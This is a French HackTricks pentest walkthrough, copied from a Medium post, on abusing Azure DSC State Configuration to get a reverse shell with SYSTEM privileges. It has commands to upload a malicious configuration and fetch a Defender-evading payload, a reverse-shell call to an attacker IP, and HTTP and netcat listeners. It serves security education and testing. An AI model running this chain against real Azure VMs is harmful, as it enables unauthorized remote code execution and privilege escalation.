# Az - State Configuration RCE

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

**Ce post a √©t√© copi√© depuis** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Pr√©paration de l'infrastructure du serveur distant (C2) <a href="#f0fa" id="f0fa"></a>

Je vais h√©berger une version all√©g√©e de la charge utile Nishang Invoke-PowerShellTcp.ps1 depuis le serveur distant "40.84.7.74", qui est la bo√Æte Kali. Le nom de la charge utile sera "RevPS.ps1". Pour √©viter que le script Nishang ne soit supprim√© par Windows Defender pour une raison quelconque (peut-√™tre pr√©f√©rez-vous d√©poser le fichier sur le disque), j'ai une version l√©g√®re ici que vous pouvez utiliser et qui contournera Defender : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Cela sera h√©berg√© par un simple serveur Python Simple sur la bo√Æte Kali.

### √âtape 1 - Cr√©er des fichiers <a href="#89de" id="89de"></a>

Nous devrons cr√©er un autre fichier de configuration DSC. Un mod√®le peut √™tre t√©l√©charg√© ici : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Ce fichier de configuration utilisera la m√™me fonction d'√©criture de fichier que celle que nous avons utilis√©e pr√©c√©demment. Cette fois, le contenu inclut du code pour t√©l√©charger et ex√©cuter une charge utile depuis notre serveur distant. De plus, nous utilisons une fonction de t√¢che planifi√©e disponible dans le module _ComputerManagementDsc_. La fonction de t√¢che planifi√©e jouera un r√¥le cl√© dans l'ex√©cution et nous fournira des privil√®ges SYSTEM plus tard.

Nous t√©l√©chargerons √©galement un script qui sera utilis√© pour publier notre configuration sur la VM. Il se trouve ici : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Ces fichiers serviront de mod√®le. **Vous devrez remplir les noms de variables et les param√®tres avec ce que vous utilisez**. Cela inclut les noms de ressources, les chemins de fichiers et les noms de serveurs externes/charges utiles que vous utilisez. Veuillez vous r√©f√©rer aux commentaires dans le code.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### √âtape 2 - Zipper le fichier de configuration <a href="#c2c2" id="c2c2"></a>

Avec nos deux fichiers cr√©√©s, nous allons compresser le fichier **'reverse\_shell\_config.ps1'** afin qu'il puisse √™tre envoy√© au compte de stockage.

```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### √âtape 3 - D√©finir le contexte de stockage et t√©l√©charger <a href="#bed9" id="bed9"></a>

Encore une fois, nous allons configurer le contexte de notre compte de stockage que j'ai d√©j√† fait. J'ai d√©j√† un conteneur nomm√© '**azure-pentes**t', c'est donc l√† que je vais publier le mien :

```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```

<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### √âtape 4 - Pr√©parer la bo√Æte Kali <a href="#20fb" id="20fb"></a>

Dans notre bo√Æte Kali, nous pouvons simplement _wget_ notre charge utile PowerShell. Le script de reverse-shell brut est situ√© ici : [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).

```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Nous devons modifier le script de reverse-shell en y ajoutant nos param√®tres, afin que la VM Windows sache o√π se connecter une fois qu'il est ex√©cut√©. Dans mon cas, j'ajoute ce qui suit :

```
RevPShell -Reverse 40.84.7.73 443
```

<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### √âtape 5 - Publier le fichier de configuration <a href="#9ad6" id="9ad6"></a>

Maintenant, nous allons ex√©cuter notre fichier de configuration. J'ai le mien configur√© pour √™tre publi√© sur le bureau pour une meilleure visualisation, mais il peut √™tre publi√© √† peu pr√®s n'importe o√π. Apr√®s quelques minutes, nous verrons que le script de reverse-shell a √©t√© publi√© !

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### √âtape 6 - H√©berger la charge utile et configurer l'√©couteur <a href="#c55f" id="c55f"></a>

Une fois que nous avons publi√© la configuration, nous pouvons simultan√©ment d√©marrer un serveur Python SimpleHTTPServer sur le port 80 pour h√©berger la charge utile, ainsi qu'un √©couteur netcat pour intercepter la connexion :

```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```

Nous voyons que la t√¢che planifi√©e a √©t√© ex√©cut√©e et que notre charge utile a √©t√© r√©cup√©r√©e et ex√©cut√©e en m√©moire avec des privil√®ges de niveau **SYSTEM** !

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclusion <a href="#1